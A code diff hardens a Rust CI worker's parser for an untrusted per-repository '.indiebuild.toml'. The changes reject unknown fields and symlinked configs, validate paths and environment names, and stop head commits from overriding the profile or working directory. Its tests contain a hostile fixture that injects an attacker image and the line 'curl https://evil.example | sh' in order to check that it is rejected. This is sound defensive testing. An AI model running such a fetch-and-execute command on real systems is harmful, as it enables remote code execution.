@@ -1,67 +1,88 @@
 //! Per-repository `.indiebuild.toml`.
 //!
-//! The contract is owned by the CLI (`gha-indie-worker-cli`, schema
-//! `gha-indie-worker.indiebuild/v1`), which is where it is authored and
-//! validated. This module is the worker's *reader*: it accepts that same
-//! shape and extracts only what executing a job requires.
-//!
-//! A repository may say **which** reviewed profile it wants and **where** in
-//! the tree to run it. It may not say what the profile does: no commands, no
-//! runner images, no mounts. That boundary is the security model, because this
-//! file is read from the commit under test and is therefore
-//! attacker-controlled on any pull request.
-//!
-//! Selecting a profile the operator has not allowed fails the job loudly
-//! rather than silently falling back, so a repository cannot quietly opt out
-//! of verification by naming something unavailable.
+//! The contract is owned by `gha-indie-worker-cli`. This worker consumes the
+//! same v1 shape, but the file still comes from the commit under test and is
+//! therefore untrusted. It may confirm trusted job policy; it never becomes
+//! authority for profile choice, working directory, commands, images, mounts,
+//! credentials, push, or deploy behavior.
 
-use std::path::Path;
+use std::{
+    collections::HashSet,
+    path::{Component, Path},
+};
 
 use serde::Deserialize;
 use tokio::fs;
 
 use crate::config::Config;
-use crate::profiles::{self, ProfileSpec};
+use crate::profiles::ProfileSpec;
 
 pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";
-
-/// Schema identity, which must match the CLI's `CONTRACT_VERSION`.
 pub(crate) const CONTRACT_VERSION: &str = "gha-indie-worker.indiebuild/v1";
 
-/// Same limit the CLI validator applies.
 const MAX_CONFIG_BYTES: u64 = 256 * 1024;
+const MAX_TARGETS: usize = 64;
+const MAX_LIST_ITEMS: usize = 128;
+const MAX_NAME_BYTES: usize = 128;
+const MAX_TIMEOUT_SECONDS: u32 = 86_400;
 
-/// Fields the worker does not act on are accepted but ignored, so that a
-/// config written against the full contract still loads here. Unknown fields
-/// are *not* rejected for the same reason: the CLI is the validator, and the
-/// worker refusing a field the contract added would break every repository at
-/// once.
+#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "lowercase")]
+pub(crate) enum RepositoryRole {
+    Client,
+    Server,
+    Mixed,
+}
+
+#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "lowercase")]
+pub(crate) enum TargetRole {
+    Client,
+    Server,
+}
+
+#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "lowercase")]
+pub(crate) enum Platform {
+    Linux,
+    Macos,
+    Windows,
+}
+
+/// Exact v1 target shape from `gha-indie-worker-cli`.
+///
+/// `deny_unknown_fields` is intentional. The worker does not delegate parsing
+/// to the CLI at runtime, so silently accepting a future execution-adjacent
+/// field would let the two authorities drift while both claim v1 compatibility.
 #[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub(crate) struct Target {
     pub name: String,
-    /// Directory the profile runs in, relative to the repository root.
-    #[serde(default = "dot")]
+    pub role: TargetRole,
     pub path: String,
-    /// Name of a fixed, operator-reviewed profile.
     pub profile: String,
-    #[serde(default)]
-    pub platform: Option<String>,
+    pub platform: Platform,
+    pub artifacts: Vec<String>,
+    pub cache_paths: Vec<String>,
+    pub env: Vec<String>,
+    pub secret_env: Vec<String>,
+    pub allow_network: bool,
+    pub allow_push: bool,
+    pub allow_deploy: bool,
+    pub timeout_seconds: u32,
 }
 
-fn dot() -> String {
-    ".".to_string()
-}
-
+/// Exact top-level v1 shape from `gha-indie-worker-cli`.
 #[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub(crate) struct RepoConfig {
     pub schema_version: String,
+    pub repository_role: RepositoryRole,
     pub default_target: String,
-    #[serde(default)]
     pub targets: Vec<Target>,
 }
 
 impl RepoConfig {
-    /// The target a job runs, which is the declared default.
     pub fn default_target(&self) -> Result<&Target, String> {
         self.targets
             .iter()
@@ -73,33 +94,79 @@ impl RepoConfig {
                 )
             })
     }
+
+    fn validate(&self) -> Result<(), String> {
+        if self.schema_version != CONTRACT_VERSION {
+            return Err(format!(
+                "{CONFIG_FILE} schema_version must equal {CONTRACT_VERSION:?}, got {:?}",
+                self.schema_version
+            ));
+        }
+        validate_token("default_target", &self.default_target)?;
+        if self.targets.is_empty() || self.targets.len() > MAX_TARGETS {
+            return Err(format!(
+                "{CONFIG_FILE} targets must contain 1-{MAX_TARGETS} entries"
+            ));
+        }
+
+        let mut names = HashSet::with_capacity(self.targets.len());
+        let mut client_targets = 0usize;
+        let mut server_targets = 0usize;
+        for target in &self.targets {
+            validate_target(target)?;
+            if !names.insert(target.name.as_str()) {
+                return Err(format!(
+                    "{CONFIG_FILE} duplicate target name {:?}",
+                    target.name
+                ));
+            }
+            match target.role {
+                TargetRole::Client => client_targets += 1,
+                TargetRole::Server => server_targets += 1,
+            }
+        }
+        if !names.contains(self.default_target.as_str()) {
+            return Err(format!(
+                "{CONFIG_FILE} default_target {:?} does not name a declared target",
+                self.default_target
+            ));
+        }
+
+        match self.repository_role {
+            RepositoryRole::Client if server_targets != 0 => Err(format!(
+                "{CONFIG_FILE} repository_role=client cannot contain server targets"
+            )),
+            RepositoryRole::Server if client_targets != 0 => Err(format!(
+                "{CONFIG_FILE} repository_role=server cannot contain client targets"
+            )),
+            RepositoryRole::Mixed if client_targets == 0 || server_targets == 0 => Err(format!(
+                "{CONFIG_FILE} repository_role=mixed requires both client and server targets"
+            )),
+            _ => Ok(()),
+        }
+    }
 }
 
 pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
     let config: RepoConfig = toml::from_str(contents)
         .map_err(|error| format!("{CONFIG_FILE} is not valid: {error}"))?;
-    if config.schema_version != CONTRACT_VERSION {
-        return Err(format!(
-            "{CONFIG_FILE} schema_version must equal {CONTRACT_VERSION:?}, got {:?}",
-            config.schema_version
-        ));
-    }
-    if config.targets.is_empty() {
-        return Err(format!("{CONFIG_FILE} declares no targets"));
-    }
+    config.validate()?;
     Ok(config)
 }
 
 /// Read the file from a cloned repository, if it has one.
 pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
     let path = repo_dir.join(CONFIG_FILE);
-    let metadata = match fs::metadata(&path).await {
+    // `metadata` follows symlinks. A PR can commit a symlink named
+    // `.indiebuild.toml`; reject that before any host path can be read.
+    let metadata = match fs::symlink_metadata(&path).await {
         Ok(metadata) => metadata,
         Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
         Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
     };
-    // A symlink would be followed out of the repository; a directory or an
-    // oversized file is not a config either.
+    if metadata.file_type().is_symlink() {
+        return Err(format!("{CONFIG_FILE} must not be a symlink"));
+    }
     if !metadata.is_file() {
         return Err(format!("{CONFIG_FILE} is not a regular file"));
     }
@@ -114,13 +181,12 @@ pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> 
     parse(&contents).map(Some)
 }
 
-/// Resolve which profile actually runs.
+/// Validate the repository-declared profile against trusted operator policy.
 ///
-/// The repository's choice wins when it names a profile the operator allows;
-/// otherwise the job fails rather than running something the repository did
-/// not ask for.
+/// Head-commit config may confirm the already-admitted profile but may not
+/// replace it with any other profile, even another globally allowed one.
 pub(crate) fn select_profile(
-    config: &Config,
+    _config: &Config,
     repo_config: Option<&RepoConfig>,
     requested: &'static ProfileSpec,
 ) -> Result<&'static ProfileSpec, String> {
@@ -128,55 +194,169 @@ pub(crate) fn select_profile(
         return Ok(requested);
     };
     let target = repo_config.default_target()?;
-
-    // Every installed profile runs Linux containers. A target asking for
-    // another platform must not quietly get a Linux run.
-    if let Some(platform) = target.platform.as_deref() {
-        if !platform.eq_ignore_ascii_case("linux") {
-            return Err(format!(
-                "{CONFIG_FILE} target {:?} wants platform {platform:?}, and this worker only runs linux",
-                target.name
-            ));
-        }
-    }
-
-    let name = target.profile.trim();
-    if name.is_empty() {
-        return Err(format!("{CONFIG_FILE} names an empty profile"));
-    }
-    if name == requested.name {
-        return Ok(requested);
-    }
-    let Some(selected) = profiles::find(name) else {
+    if target.platform != Platform::Linux {
         return Err(format!(
-            "{CONFIG_FILE} selects profile {name:?}, which is not installed"
-        ));
-    };
-    if !config.allowed_profiles.contains(selected.name) {
-        return Err(format!(
-            "{CONFIG_FILE} selects profile {name:?}, which this worker does not allow"
+            "{CONFIG_FILE} target {:?} wants platform {:?}, and this worker only runs linux",
+            target.name, target.platform
         ));
     }
-    Ok(selected)
+    if target.profile != requested.name {
+        return Err(format!(
+            "{CONFIG_FILE} selects profile {:?}, but trusted job policy requires {:?}; head-commit config cannot override the operator-selected profile",
+            target.profile, requested.name
+        ));
+    }
+    Ok(requested)
 }
 
-/// The repository-relative directory the selected target runs in, when it is
-/// not the repository root.
+/// Head-commit config is not execution authority for the working directory.
 pub(crate) fn context_override(repo_config: Option<&RepoConfig>) -> Option<String> {
     let target = repo_config?.default_target().ok()?;
-    let path = target.path.trim();
-    if path.is_empty() || path == "." {
-        None
-    } else {
-        Some(path.to_string())
+    let _descriptive_path = target.path.as_str();
+    None
+}
+
+fn validate_target(target: &Target) -> Result<(), String> {
+    validate_token("target.name", &target.name)?;
+    validate_token("target.profile", &target.profile)?;
+    validate_repo_relative_path("target.path", &target.path)?;
+    validate_path_list("target.artifacts", &target.artifacts)?;
+    validate_path_list("target.cache_paths", &target.cache_paths)?;
+    validate_env_list("target.env", &target.env)?;
+    validate_env_list("target.secret_env", &target.secret_env)?;
+
+    let plain = target.env.iter().map(String::as_str).collect::<HashSet<_>>();
+    if let Some(duplicate) = target
+        .secret_env
+        .iter()
+        .map(String::as_str)
+        .find(|name| plain.contains(name))
+    {
+        return Err(format!(
+            "{CONFIG_FILE} environment name {duplicate:?} cannot be declared in both env and secret_env"
+        ));
     }
+    if target.role == TargetRole::Client && (target.allow_push || target.allow_deploy) {
+        return Err(format!(
+            "{CONFIG_FILE} client target {:?} cannot enable image push or deployment",
+            target.name
+        ));
+    }
+    if target.timeout_seconds == 0 || target.timeout_seconds > MAX_TIMEOUT_SECONDS {
+        return Err(format!(
+            "{CONFIG_FILE} target {:?} timeout_seconds must be 1-{MAX_TIMEOUT_SECONDS}",
+            target.name
+        ));
+    }
+
+    // These fields are currently descriptive only in the worker, but validate
+    // them exactly like the CLI so v1 cannot silently mean two different things.
+    let _ = target.allow_network;
+    Ok(())
+}
+
+fn validate_token(label: &str, value: &str) -> Result<(), String> {
+    if value.is_empty() || value.len() > MAX_NAME_BYTES {
+        return Err(format!(
+            "{CONFIG_FILE} {label} must be 1-{MAX_NAME_BYTES} bytes"
+        ));
+    }
+    if value.chars().any(char::is_control) || value.chars().any(char::is_whitespace) {
+        return Err(format!(
+            "{CONFIG_FILE} {label} cannot contain whitespace or control characters"
+        ));
+    }
+    Ok(())
+}
+
+fn validate_path_list(label: &str, values: &[String]) -> Result<(), String> {
+    if values.len() > MAX_LIST_ITEMS {
+        return Err(format!(
+            "{CONFIG_FILE} {label} can contain at most {MAX_LIST_ITEMS} entries"
+        ));
+    }
+    let mut unique = HashSet::with_capacity(values.len());
+    for value in values {
+        validate_repo_relative_path(label, value)?;
+        if !unique.insert(value.as_str()) {
+            return Err(format!("{CONFIG_FILE} duplicate {label} entry {value:?}"));
+        }
+    }
+    Ok(())
+}
+
+fn validate_repo_relative_path(label: &str, value: &str) -> Result<(), String> {
+    if value.trim().is_empty() || value.len() > 240 {
+        return Err(format!(
+            "{CONFIG_FILE} {label} must be a non-empty repository-relative path of at most 240 bytes"
+        ));
+    }
+    let path = Path::new(value);
+    if path.is_absolute() {
+        return Err(format!(
+            "{CONFIG_FILE} {label} must be relative to the repository root"
+        ));
+    }
+    for component in path.components() {
+        match component {
+            Component::Normal(part) => {
+                let part = part
+                    .to_str()
+                    .ok_or_else(|| format!("{CONFIG_FILE} {label} must be valid UTF-8"))?;
+                if part
+                    .chars()
+                    .any(|ch| matches!(ch, ',' | '=' | ':' | '\0') || ch.is_control())
+                {
+                    return Err(format!(
+                        "{CONFIG_FILE} {label} contains unsupported path characters"
+                    ));
+                }
+            }
+            Component::CurDir => {}
+            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
+                return Err(format!(
+                    "{CONFIG_FILE} {label} must stay inside the repository root"
+                ));
+            }
+        }
+    }
+    Ok(())
+}
+
+fn validate_env_list(label: &str, values: &[String]) -> Result<(), String> {
+    if values.len() > MAX_LIST_ITEMS {
+        return Err(format!(
+            "{CONFIG_FILE} {label} can contain at most {MAX_LIST_ITEMS} entries"
+        ));
+    }
+    let mut unique = HashSet::with_capacity(values.len());
+    for value in values {
+        if value.is_empty() || value.len() > MAX_NAME_BYTES {
+            return Err(format!(
+                "{CONFIG_FILE} {label} names must be 1-{MAX_NAME_BYTES} bytes"
+            ));
+        }
+        let mut chars = value.chars();
+        let first = chars.next().expect("checked non-empty");
+        if !(first.is_ascii_alphabetic() || first == '_')
+            || !chars.all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
+        {
+            return Err(format!(
+                "{CONFIG_FILE} {label} entry {value:?} is not a valid environment variable name"
+            ));
+        }
+        if !unique.insert(value.as_str()) {
+            return Err(format!("{CONFIG_FILE} duplicate {label} entry {value:?}"));
+        }
+    }
+    Ok(())
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::profiles;
 
-    /// The canonical example from the CLI repository's own .indiebuild.toml.
     const CANONICAL: &str = r#"schema_version = "gha-indie-worker.indiebuild/v1"
 repository_role = "client"
 default_target = "cli"
@@ -208,27 +388,32 @@ timeout_seconds = 1800
     }
 
     #[test]
-    fn the_contract_the_cli_writes_is_readable_here() {
-        // If this breaks, the worker and the CLI have diverged on the file
-        // they both claim to speak.
+    fn canonical_cli_contract_is_accepted() {
         let parsed = parse(CANONICAL).expect("canonical config parses");
+        assert_eq!(parsed.repository_role, RepositoryRole::Client);
         assert_eq!(parsed.default_target().expect("target").profile, "rust-verify");
-        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect("allowed");
-        assert_eq!(selected.name, "rust-verify");
     }
 
     #[test]
-    fn a_repository_may_select_another_allowed_profile() {
+    fn unknown_fields_are_rejected_instead_of_becoming_silent_schema_drift() {
+        let hostile = format!(
+            "{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n"
+        );
+        let error = parse(&hostile).expect_err("v1 must reject undeclared fields");
+        assert!(error.contains("unknown field") || error.contains("not valid"), "{error}");
+    }
+
+    #[test]
+    fn a_head_commit_cannot_downgrade_to_another_allowed_profile() {
         let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
         let parsed = parse(&config).expect("parses");
-        let selected = select_profile(
+        let error = select_profile(
             &test_config(&["rust-verify", "node-verify"]),
             Some(&parsed),
             rust_verify(),
         )
-        .expect("selection allowed");
-        assert_eq!(selected.name, "node-verify");
+        .expect_err("head config must not replace trusted job policy");
+        assert!(error.contains("cannot override"), "{error}");
     }
 
     #[test]
@@ -239,54 +424,10 @@ timeout_seconds = 1800
     }
 
     #[test]
-    fn a_repository_cannot_select_a_profile_the_operator_disallows() {
-        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
-        let parsed = parse(&config).expect("parses");
-        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect_err("must not run a disallowed profile");
-        assert!(error.contains("does not allow"), "{error}");
-    }
-
-    #[test]
-    fn unknown_profiles_fail_loudly_instead_of_falling_back() {
-        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"curl-attacker-sh\"");
-        let parsed = parse(&config).expect("parses");
-        let error = select_profile(
-            &test_config(&["rust-verify", "node-verify"]),
-            Some(&parsed),
-            rust_verify(),
-        )
-        .expect_err("unknown profile must fail");
-        assert!(error.contains("not installed"), "{error}");
-    }
-
-    #[test]
-    fn the_file_cannot_describe_what_a_profile_does() {
-        // The security boundary: a repository names a profile, never defines
-        // one. Adding commands or images changes nothing about execution.
-        let hostile = format!("{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n");
-        let parsed = parse(&hostile).expect("extra keys are ignored, not honoured");
-        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect("still the reviewed profile");
-        assert_eq!(selected.name, "rust-verify");
-        assert_eq!(selected.steps.len(), rust_verify().steps.len());
-        assert_eq!(selected.steps[0].image, rust_verify().steps[0].image);
-    }
-
-    #[test]
     fn a_foreign_schema_version_is_refused() {
         let wrong = CANONICAL.replace(CONTRACT_VERSION, "something-else/v9");
         let error = parse(&wrong).expect_err("schema version must match");
         assert!(error.contains("schema_version"), "{error}");
-    }
-
-    #[test]
-    fn a_default_target_that_names_nothing_is_an_error() {
-        let orphan = CANONICAL.replace("default_target = \"cli\"", "default_target = \"missing\"");
-        let parsed = parse(&orphan).expect("parses");
-        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect_err("default_target must resolve");
-        assert!(error.contains("does not name a declared target"), "{error}");
     }
 
     #[test]
@@ -299,12 +440,41 @@ timeout_seconds = 1800
     }
 
     #[test]
-    fn a_target_path_becomes_the_working_directory() {
+    fn cli_validation_rules_are_replayed_in_the_worker() {
+        assert!(parse(&CANONICAL.replace("path = \".\"", "path = \"../outside\"")).is_err());
+        assert!(parse(&CANONICAL.replace("timeout_seconds = 1800", "timeout_seconds = 0")).is_err());
+        assert!(parse(&CANONICAL.replace("env = []", "env = [\"A\"]").replace("secret_env = []", "secret_env = [\"A\"]")).is_err());
+        assert!(parse(&CANONICAL.replace("allow_push = false", "allow_push = true")).is_err());
+    }
+
+    #[test]
+    fn a_head_commit_cannot_redirect_verification_to_an_easier_subtree() {
         assert_eq!(context_override(Some(&parse(CANONICAL).unwrap())), None);
-        let nested = CANONICAL.replace("path = \".\"", "path = \"services/api\"");
-        assert_eq!(
-            context_override(Some(&parse(&nested).unwrap())),
-            Some("services/api".to_string())
-        );
+        let nested = CANONICAL.replace("path = \".\"", "path = \"services/easy-fixture\"");
+        assert_eq!(context_override(Some(&parse(&nested).unwrap())), None);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn symlinked_config_is_rejected_without_following_it() {
+        use std::os::unix::fs::symlink;
+
+        let root = std::env::temp_dir().join(format!(
+            "gha-indie-worker-indiebuild-{}",
+            uuid::Uuid::new_v4()
+        ));
+        std::fs::create_dir_all(&root).expect("temp root");
+        let outside = root.with_extension("outside.toml");
+        std::fs::write(&outside, CANONICAL).expect("outside config");
+        symlink(&outside, root.join(CONFIG_FILE)).expect("symlink config");
+
+        let error = read(&root)
+            .await
+            .expect_err("worker must reject a config symlink before reading its target");
+        assert!(error.contains("must not be a symlink"), "{error}");
+
+        let _ = std::fs::remove_file(root.join(CONFIG_FILE));
+        let _ = std::fs::remove_dir(&root);
+        let _ = std::fs::remove_file(&outside);
     }
 }
